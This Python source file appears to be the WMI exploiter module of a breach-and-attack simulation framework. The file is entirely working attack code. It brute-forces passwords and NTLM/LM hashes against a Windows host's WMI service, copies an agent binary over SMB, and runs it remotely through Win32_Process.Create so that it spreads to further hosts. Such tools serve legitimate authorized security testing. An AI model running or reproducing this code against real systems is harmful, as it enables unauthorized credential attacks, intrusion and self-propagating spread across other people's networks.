import logging
import ntpath
import socket
import traceback

from impacket.dcerpc.v5.rpcrt import DCERPCException

from infection_monkey.exploit.HostExploiter import HostExploiter
from infection_monkey.exploit.tools.helpers import get_agent_dst_path
from infection_monkey.exploit.tools.smb_tools import SmbTools
from infection_monkey.exploit.tools.wmi_tools import AccessDeniedException, WmiTools
from infection_monkey.i_puppet import ExploiterResultData
from infection_monkey.model import DROPPER_CMDLINE_WINDOWS, MONKEY_CMDLINE_WINDOWS
from infection_monkey.utils.brute_force import (
    generate_brute_force_combinations,
    get_credential_string,
)
from infection_monkey.utils.commands import DROPPER_TARGET_PATH_WIN64, build_monkey_commandline
from infection_monkey.utils.threading import interruptible_iter

logger = logging.getLogger(__name__)


class WmiExploiter(HostExploiter):
    _EXPLOITED_SERVICE = "WMI (Windows Management Instrumentation)"

    @WmiTools.impacket_user
    @WmiTools.dcom_wrap
    def _exploit_host(self) -> ExploiterResultData:

        creds = generate_brute_force_combinations(self.options["credentials"])
        intp_creds = interruptible_iter(
            creds,
            self.interrupt,
            "WMI exploiter has been interrupted",
            logging.INFO,
        )

        for user, password, lm_hash, ntlm_hash in intp_creds:

            creds_for_log = get_credential_string([user, password, lm_hash, ntlm_hash])
            logger.debug(f"Attempting to connect to {self.host} using WMI with {creds_for_log}")

            wmi_connection = WmiTools.WmiConnection()

            try:
                wmi_connection.connect(self.host, user, password, None, lm_hash, ntlm_hash)
            except AccessDeniedException:
                self.report_login_attempt(False, user, password, lm_hash, ntlm_hash)
                logger.debug(f"Failed connecting to {self.host} using WMI")
                continue
            except DCERPCException:
                self.report_login_attempt(False, user, password, lm_hash, ntlm_hash)
                logger.debug(f"Failed connecting to {self.host} using WMI")
                continue

            except socket.error:
                logger.debug(f"Network error in WMI connection to {self.host}")
                return self.exploit_result

            except Exception as exc:
                logger.debug(
                    f"Unknown WMI connection error to {self.host}: "
                    f"{exc} {traceback.format_exc()}"
                )
                return self.exploit_result

            self.report_login_attempt(True, user, password, lm_hash, ntlm_hash)
            self.exploit_result.exploitation_success = True

            downloaded_agent = self.agent_binary_repository.get_agent_binary(self.host.os["type"])

            if self._is_interrupted():
                self._set_interrupted()
                return self.exploit_result

            target_path = get_agent_dst_path(self.host)

            remote_full_path = SmbTools.copy_file(
                self.host,
                downloaded_agent,
                target_path,
                user,
                password,
                lm_hash,
                ntlm_hash,
                self.options["smb_download_timeout"],
            )

            if not remote_full_path:
                wmi_connection.close()
                return self.exploit_result
            # execute the remote dropper in case the path isn't final
            elif remote_full_path.lower() != DROPPER_TARGET_PATH_WIN64:
                cmdline = DROPPER_CMDLINE_WINDOWS % {
                    "dropper_path": remote_full_path
                } + build_monkey_commandline(
                    self.host,
                    self.current_depth + 1,
                    DROPPER_TARGET_PATH_WIN64,
                )
            else:
                cmdline = MONKEY_CMDLINE_WINDOWS % {
                    "monkey_path": remote_full_path
                } + build_monkey_commandline(self.host, self.current_depth + 1)

            # execute the remote monkey
            result = WmiTools.get_object(wmi_connection, "Win32_Process").Create(
                cmdline, ntpath.split(remote_full_path)[0], None
            )

            if (0 != result.ProcessId) and (not result.ReturnValue):
                logger.info(
                    "Executed dropper '%s' on remote victim %r (pid=%d, cmdline=%r)",
                    remote_full_path,
                    self.host,
                    result.ProcessId,
                    cmdline,
                )

                self.add_vuln_port(port="unknown")
                self.exploit_result.propagation_success = True
            else:
                error_message = (
                    "Error executing dropper '%s' on remote victim %r (pid=%d, exit_code=%d, "
                    "cmdline=%r)",
                    remote_full_path,
                    self.host,
                    result.ProcessId,
                    result.ReturnValue,
                    cmdline,
                )
                logger.debug(error_message)
                self.exploit_result.error_message = error_message

            result.RemRelease()
            wmi_connection.close()
            self.add_executed_cmd(cmdline)
            return self.exploit_result

        return self.exploit_result
